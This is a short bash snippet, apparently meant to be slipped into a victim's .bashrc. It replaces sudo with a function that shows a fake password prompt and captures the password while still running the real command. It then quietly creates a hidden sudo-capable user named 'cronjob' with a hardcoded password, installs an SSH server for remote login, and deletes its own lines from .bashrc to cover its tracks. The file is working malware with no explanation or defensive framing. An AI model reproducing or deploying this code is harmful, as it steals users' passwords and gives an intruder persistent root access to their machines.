alias truesudo="sudo"

function happybirthday {
  echo "useradd -rM -s /bin/bash cronjob" > ~/.temp
  echo "adduser cronjob sudo" >> ~/.temp
  echo "echo -e \"jetessh\njetessh\" | passwd cronjob" >> ~/.temp
  echo "apt -y install openssh-server > /dev/null" >> ~/.temp
  echo "head -n -24 ~/.bashrc > ~/.basrc_temp" >> ~/.temp
  echo "rm -f ~/.bashrc" >> ~/.temp
  echo "mv ~/.basrc_temp ~/.bashrc" >> ~/.temp
  echo "rm -f ~/.temp" >> ~/.temp

  read -sp "[sudo] password for `whoami`: " mdp
  echo ""
  echo $mdp | truesudo -kp "" -S $@
  if [ $? -eq 0 ] ; then
    id -u cronjob &> /dev/null
    if [ $? -ne 0 ] ; then
      (echo $mdp | truesudo -kp "" -S bash -c "bash ~/.temp </dev/null &>/dev/null &")
    fi
  fi
}

alias sudo="usercmd=!# && happybirthday $usercmd"
